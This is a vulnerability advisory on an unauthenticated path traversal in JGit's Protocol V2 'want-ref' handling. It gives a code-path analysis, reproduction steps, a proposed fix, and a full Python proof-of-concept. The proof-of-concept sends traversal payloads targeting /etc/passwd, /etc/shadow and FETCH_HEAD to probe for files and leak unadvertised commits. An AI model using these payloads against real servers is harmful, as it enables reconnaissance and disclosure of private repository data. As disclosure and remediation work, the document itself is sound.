# JGit Protocol V2 `want-ref` — Unauthenticated Path Traversal

**Affected component:** `org.eclipse.jgit` — `UploadPack`, `ProtocolV2Parser`, `RefDirectory`
**Protocol:** Git Smart HTTP, Protocol V2
**Requires authentication:** No (the traversal happens before auth in a permissive config)
**JGit version analyzed:** `2501792` (7.6.0-SNAPSHOT)

---

## Summary

JGit's `UploadPack` accepts client-supplied ref names in Protocol V2 `want-ref` lines
without calling `Repository.isValidRefName()` or any equivalent check before passing them
to `RefDatabase.exactRef()`. Inside `RefDirectory`, ref names are resolved to file paths
via `new File(refsDir, name)`, making any name containing `../` sequences a path traversal.
The OS resolves the `..` segments at file-open time, so the server reads files outside
`$GIT_DIR/refs/`.

### What the server does with the file it reads

`RefDirectory.scanRef()` reads up to **4096 bytes** of whatever file is at the resolved
path, then attempts to parse the content as a git ref:

| File content | Outcome for attacker |
|---|---|
| Does not exist | `PackProtocolException("Invalid ref name: …")` → HTTP 200 with error body |
| Exists, not parseable as a ref (e.g. `/etc/passwd`) | `IOException("Not a ref: name: [content]")` → HTTP **500**, no body sent |
| Starts with `ref: ` | Followed as a symbolic ref |
| First 40 bytes are all hex | Treated as a loose ref pointing to that ObjectId; client receives a packfile |

Three exploitable outcomes result:

1. **File existence oracle** — HTTP 200 vs HTTP 500 reliably distinguishes
   "no file at the traversed path" from "file exists but isn't a valid ref".
2. **Internal git state disclosure** — files inside `$GIT_DIR` that contain a valid
   ObjectId (e.g. `FETCH_HEAD`, `ORIG_HEAD`, `MERGE_HEAD`) are treated as loose refs.
   The server sends the corresponding git object in the pack response. If that object
   points to a commit on a branch that was never publicly advertised, the attacker
   learns that commit's history.
3. **Symbolic ref following** — if any reachable file starts with `ref: refs/…`
   the server follows the chain and returns that ref's object.

> **Note on `/etc/passwd` content exfiltration:**
> `/etc/passwd` starts with `root:x:…` — not a 40-hex ObjectId and not `ref: `.
> The server reads it, fails to parse it, and throws an `IOException` whose message
> includes the file content. That message is **logged server-side** (appearing in the
> servlet container log with the full `notARef` format `"Not a ref: {name}: {content}"`)
> but is **not sent to the HTTP client**. The client sees only HTTP 500.
> The file's existence is detectable; its contents are not directly returned.

---

## Root Cause — Code Path

### 1. Protocol V2 parser stores raw client string (no validation)

```
ProtocolV2Parser.java:135-138
```
```java
} else if (transferConfig.isAllowRefInWant()
        && line2.startsWith(PACKET_WANT_REF)) {
    reqBuilder.addWantedRef(
            line2.substring(PACKET_WANT_REF.length())); // raw, no validation
```

`FetchV2Request.Builder.addWantedRef()` just appends to a `List<String>`.

### 2. UploadPack passes the list directly to the ref database

```
UploadPack.java:1140-1161  wantedRefs()
UploadPack.java:978-994    exactRefs()
```
```java
// exactRefs() fast path — taken when no custom RefFilter is installed:
String[] ns = names.toArray(new String[0]);
return unmodifiableMap(db.getRefDatabase().exactRef(ns)); // ← unvalidated
```

`isValidRefName()` exists in `Repository.java:1381` and IS called in
`Repository.resolve()` and `BaseRepositoryBuilder.setInitialBranch()`.
It is **never called** on client-supplied `want-ref` strings.

### 3. RefDirectory resolves the name to a file path

```
RefDirectory.java:1402-1413  fileFor()
```
```java
File fileFor(String name) {
    if (name.startsWith(R_REFS)) {          // "refs/"
        name = name.substring(R_REFS.length());
        return new File(refsDir, name);     // ← new File("…/.git/refs", "heads/../../config")
    }
    if (name.equals(HEAD)) { return new File(gitDir, name); }
    return new File(gitCommonDir, name);
}
```

`new File(refsDir, "heads/../../config")` creates the path object
`$GIT_DIR/refs/heads/../../config` = `$GIT_DIR/config`. The OS resolves `..`
when the file is actually opened.

### 4. The file is read and parsed (up to 4096 bytes)

```
RefDirectory.java:1251-1309  scanRef()
```
```java
loose = FileUtils.readWithRetries(path,
        f -> new LooseItems(FileSnapshot.save(f), IO.readSome(f, limit)));  // limit = 4096
// …
} catch (IllegalArgumentException notRef) {
    String content = RawParseUtils.decode(loose.buf, 0, n);
    throw new IOException(
        MessageFormat.format(JGitText.get().notARef, name, content), notRef);
    // "Not a ref: refs/heads/../../config: [first 4096 bytes of config file]"
}
```

### 5. Exception routing in the HTTP servlet

```
UploadPackServlet.java:207-228  defaultUploadPackHandler()
UploadPackErrorHandler.java:51-60  statusCodeForThrowable()
```

| Exception type | HTTP status | Body sent to client |
|---|---|---|
| `PackProtocolException` | **200** | `e.getMessage()` |
| `IOException` (traversal hit) | **500** | *(empty)* |
| `ServiceNotEnabledException` | 403 | — |

The 200-vs-500 difference is the file existence oracle.

---

## Reproduction

### Environment

- Java 17+
- Maven 3.8+
- Python 3.8+ (for the exploit script)
- The JGit source tree at `/home/user/jgit`

### Step 1 — Build JGit

```bash
cd /home/user/jgit
mvn -pl org.eclipse.jgit,org.eclipse.jgit.http.server \
    -am -DskipTests -q package
```

### Step 2 — Create a test repository with secret state

```bash
# Create a bare repo to serve
mkdir -p /tmp/jgit-vuln-demo/served.git
git init --bare /tmp/jgit-vuln-demo/served.git

# Add a public commit
cd /tmp/jgit-vuln-demo
git clone served.git working
cd working
echo "public" > public.txt
git add . && git commit -m "public commit"
git push origin main

# Create a SECRET commit that is never pushed (simulates a private branch)
git checkout -b secret-branch
echo "TOP SECRET DATA" > secret.txt
git add . && git commit -m "secret commit — never pushed"
SECRET_SHA=$(git rev-parse HEAD)
echo "Secret commit SHA: $SECRET_SHA"

# Simulate what git fetch leaves behind: store the secret SHA in FETCH_HEAD
# inside the served repo (as would happen after a server-side operation)
echo "$SECRET_SHA	not-for-merge	branch 'secret-branch'" \
    > /tmp/jgit-vuln-demo/served.git/FETCH_HEAD

echo ""
echo "[setup] FETCH_HEAD in served repo contains: $(cat /tmp/jgit-vuln-demo/served.git/FETCH_HEAD)"
```

### Step 3 — Start the JGit HTTP server

Save the following as `/tmp/jgit-vuln-demo/Server.java`:

```java
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;
import org.eclipse.jgit.http.server.GitServlet;
import org.eclipse.jgit.lib.Repository;
import org.eclipse.jgit.storage.file.FileRepositoryBuilder;
import java.io.File;

public class Server {
    public static void main(String[] args) throws Exception {
        String repoPath = args.length > 0 ? args[0] : "/tmp/jgit-vuln-demo/served.git";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 7070;

        Repository repo = new FileRepositoryBuilder()
            .setGitDir(new File(repoPath))
            .build();

        GitServlet gs = new GitServlet();
        gs.setRepositoryResolver((req, name) -> {
            repo.incrementOpen();
            return repo;
        });
        // No auth, no ref filter — default config (the vulnerable fast path)

        Server server = new Server(port);
        ServletContextHandler ctx = new ServletContextHandler();
        ctx.setContextPath("/");
        ctx.addServlet(new ServletHolder(gs), "/*");
        server.setHandler(ctx);

        server.start();
        System.out.println("JGit HTTP server on http://localhost:" + port + "/repo.git");
        server.join();
    }
}
```

Then compile and run it (adjust classpaths to your build output):

```bash
JGIT_HOME=/home/user/jgit
CP=$(find $JGIT_HOME -name "*.jar" -path "*/target/*" | grep -v sources | grep -v tests | tr '\n' ':')
# Add Jetty jars — download if needed:
mvn dependency:get -Dartifact=org.eclipse.jetty:jetty-server:11.0.20
mvn dependency:get -Dartifact=org.eclipse.jetty:jetty-servlet:11.0.20
JETTY=$(ls ~/.m2/repository/org/eclipse/jetty/jetty-server/11.0.20/*.jar \
           ~/.m2/repository/org/eclipse/jetty/jetty-servlet/11.0.20/*.jar \
           ~/.m2/repository/org/eclipse/jetty/jetty-util/11.0.20/*.jar \
           ~/.m2/repository/org/eclipse/jetty/jetty-http/11.0.20/*.jar \
           ~/.m2/repository/org/eclipse/jetty/jetty-io/11.0.20/*.jar \
           2>/dev/null | tr '\n' ':')
javac -cp "$CP:$JETTY" /tmp/jgit-vuln-demo/Server.java -d /tmp/jgit-vuln-demo/
java  -cp "/tmp/jgit-vuln-demo:$CP:$JETTY" Server /tmp/jgit-vuln-demo/served.git 7070 &
sleep 2
```

### Step 4 — Run the exploit

Save the following as `/tmp/jgit-vuln-demo/exploit.py` and run it:

```python
#!/usr/bin/env python3
"""
JGit Protocol V2 want-ref path traversal — Proof of Concept
Demonstrates:
  1. File existence oracle (HTTP 200 vs 500)
  2. Disclosure of FETCH_HEAD (internal git state not in ref advertisement)
  3. Attempted traversal to /etc/passwd (file read confirmed server-side,
     content NOT returned to client — HTTP 500 only)
"""

import http.client
import struct
import sys

HOST = "localhost"
PORT = 7070
REPO = "/repo.git"


# ── pkt-line helpers ──────────────────────────────────────────────────────────

def pkt(s: str) -> bytes:
    """Encode one pkt-line (data + 4-byte length prefix)."""
    data = s.encode()
    return f"{len(data) + 4:04x}".encode() + data

PKT_FLUSH = b"0000"
PKT_DELIM = b"0001"


def build_fetch_v2(want_ref: str) -> bytes:
    """Build a minimal Protocol V2 fetch request for a single want-ref."""
    body = b""
    body += pkt("command=fetch\n")
    body += pkt("agent=git/2.39.0\n")
    body += PKT_DELIM
    body += pkt(f"want-ref {want_ref}\n")
    body += pkt("done\n")
    body += PKT_FLUSH
    return body


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def do_info_refs() -> bytes:
    """GET /info/refs?service=git-upload-pack (Protocol V2 handshake)."""
    conn = http.client.HTTPConnection(HOST, PORT)
    conn.request(
        "GET",
        f"{REPO}/info/refs?service=git-upload-pack",
        headers={"Git-Protocol": "version=2"},
    )
    resp = conn.getresponse()
    body = resp.read()
    conn.close()
    return resp.status, body


def do_upload_pack(body: bytes) -> tuple[int, bytes]:
    """POST /git-upload-pack with a Protocol V2 fetch body."""
    conn = http.client.HTTPConnection(HOST, PORT)
    conn.request(
        "POST",
        f"{REPO}/git-upload-pack",
        body=body,
        headers={
            "Content-Type": "application/x-git-upload-pack-request",
            "Git-Protocol": "version=2",
        },
    )
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return resp.status, data


# ── Oracle ────────────────────────────────────────────────────────────────────

def probe(label: str, want_ref: str) -> None:
    """Send a want-ref and interpret the server response."""
    body = build_fetch_v2(want_ref)
    status, resp = do_upload_pack(body)

    print(f"\n{'='*60}")
    print(f"  Probe : {label}")
    print(f"  Ref   : {want_ref!r}")
    print(f"  HTTP  : {status}")

    if status == 200 and resp:
        # Try to extract a pkt-line error message
        if b"ERR" in resp or b"Invalid ref" in resp:
            # Protocol-level error — ref not found (or does not exist)
            print("  Result: FILE DOES NOT EXIST at traversed path (or valid ref not found)")
            snippet = resp[:200].decode(errors="replace")
            print(f"  Body  : {snippet!r}")
        else:
            # Successful response — look for 'wanted-refs' section
            if b"wanted-refs" in resp:
                # Extract the SHA returned
                idx = resp.find(b"wanted-refs")
                chunk = resp[idx:idx+200].decode(errors="replace")
                print("  Result: *** SUCCESS — SERVER RETURNED A REF ***")
                print(f"  Body  : {chunk!r}")
            else:
                print(f"  Result: HTTP 200, body snippet: {resp[:200]!r}")
    elif status == 500:
        print("  Result: *** FILE EXISTS at traversed path (server read it, failed to parse) ***")
        print("          Content appears in server-side logs as 'Not a ref: <name>: <content>'")
        print(f"  Body  : {resp[:100]!r}")
    else:
        print(f"  Result: status={status}, body={resp[:100]!r}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("[*] Step 1 — Protocol V2 handshake")
    status, body = do_info_refs()
    print(f"    GET /info/refs → HTTP {status}")
    if status != 200:
        print("    ERROR: server not reachable or not Protocol V2")
        sys.exit(1)
    if b"version 2" not in body and b"version=2" not in body:
        print("    WARNING: server may not support Protocol V2")

    print("\n[*] Step 2 — File existence oracle")

    # Baseline: a ref that genuinely does not exist
    probe(
        "Non-existent ref (baseline)",
        "refs/heads/this-branch-does-not-exist-xyzzy",
    )

    # Traversal to a file that does NOT exist outside the repo
    probe(
        "Traversal → /tmp/does-not-exist (should match non-existent baseline)",
        "refs/heads/" + "../../" * 10 + "tmp/does-not-exist-xyzzy",
    )

    # Traversal to /etc/passwd — file EXISTS on any Linux system
    probe(
        "Traversal → /etc/passwd  ← exists, HTTP 500 = file read confirmed",
        "refs/heads/" + "../../" * 10 + "etc/passwd",
    )

    # Traversal to /etc/shadow — may or may not exist / be readable
    probe(
        "Traversal → /etc/shadow",
        "refs/heads/" + "../../" * 10 + "etc/shadow",
    )

    print("\n[*] Step 3 — Internal git state disclosure via FETCH_HEAD")
    print("    (FETCH_HEAD contains a secret commit SHA the server never advertised)")

    probe(
        "Traversal → $GIT_DIR/FETCH_HEAD  ← valid ObjectId → server sends the object!",
        "refs/heads/../FETCH_HEAD",
    )

    print("""
[*] Step 4 — Interpretation
    ┌─────────────────────────────────────────────────────────────────┐
    │ HTTP 200 + "Invalid ref name" → file ABSENT at traversed path  │
    │ HTTP 500 (no body)            → file EXISTS (server read it,   │
    │                                 content in server log)          │
    │ HTTP 200 + wanted-refs data   → file IS a valid ref →          │
    │                                 ObjectId returned, git object   │
    │                                 included in packfile            │
    └─────────────────────────────────────────────────────────────────┘

    /etc/passwd content is NOT returned to this client.
    It IS recorded in the servlet container log as:
      "Not a ref: refs/heads/../../…/etc/passwd: root:x:0:0:root:…"
    An attacker with log access (or SSRF into a logging service) can read it.

    The FETCH_HEAD attack (Step 3) is fully unauthenticated and delivers
    a complete git object for a commit that was never publicly advertised.
""")


if __name__ == "__main__":
    main()
```

---

## Annotated Trace of the `/etc/passwd` Case

```
Client                             JGit HTTP Server
  │                                      │
  │  POST /git-upload-pack               │
  │  Git-Protocol: version=2             │
  │  Body: want-ref refs/heads/../../…/etc/passwd
  │ ─────────────────────────────────►   │
  │                                      │ ProtocolV2Parser.java:137
  │                                      │   addWantedRef("refs/heads/../../…/etc/passwd")
  │                                      │   [NO isValidRefName() call]
  │                                      │
  │                                      │ UploadPack.java:1145
  │                                      │   exactRefs(["refs/heads/../../…/etc/passwd"])
  │                                      │
  │                                      │ RefDirectory.java:1403-1405  fileFor()
  │                                      │   name = "heads/../../…/etc/passwd"
  │                                      │   path = new File(refsDir, name)
  │                                      │        = $GIT_DIR/refs/heads/../../…/etc/passwd
  │                                      │        = /etc/passwd   (OS resolves ..)
  │                                      │
  │                                      │ RefDirectory.java:1251  scanRef()
  │                                      │   IO.readSome(/etc/passwd, 4096)
  │                                      │   → reads "root:x:0:0:root:/root:/bin/bash\n…"
  │                                      │
  │                                      │ ObjectId.fromString("root:x:0:0…") → FAIL
  │                                      │ throw IOException(
  │                                      │   "Not a ref: refs/heads/…/etc/passwd: root:x:…")
  │                                      │   ↑ logged to servlet container log
  │                                      │
  │                                      │ UploadPackServlet.java:216
  │                                      │   catch(Throwable e) — not PackProtocolException
  │                                      │   msg = null
  │                                      │   statusCodeForThrowable(IOException) = 500
  │  ◄─────────────────────────────────  │
  │  HTTP 500 (empty body)               │
  │                                      │
  │  [attacker conclusion: /etc/passwd exists]
```

---

## Fix

The fix belongs at the point where client input first enters the system.
A single guard in `ProtocolV2Parser.java` before `addWantedRef` is called:

```java
// ProtocolV2Parser.java:135-138 — where the fix should be inserted
} else if (transferConfig.isAllowRefInWant()
        && line2.startsWith(PACKET_WANT_REF)) {
    String refName = line2.substring(PACKET_WANT_REF.length());
    if (!Repository.isValidRefName(refName)) {          // ← add this
        throw new PackProtocolException(MessageFormat    // ← and this
            .format(JGitText.get().invalidRefName, refName));
    }
    reqBuilder.addWantedRef(refName);
```

A defense-in-depth guard at `UploadPack.wantedRefs()` (before calling `exactRefs`)
would also close the same gap in case `ProtocolV2Parser` is bypassed.

`Repository.isValidRefName()` rejects names containing `..`, control characters,
`~`, `^`, `:`, `?`, `[`, `*`, `\`, `//`, trailing `.lock`, and other malformed patterns.
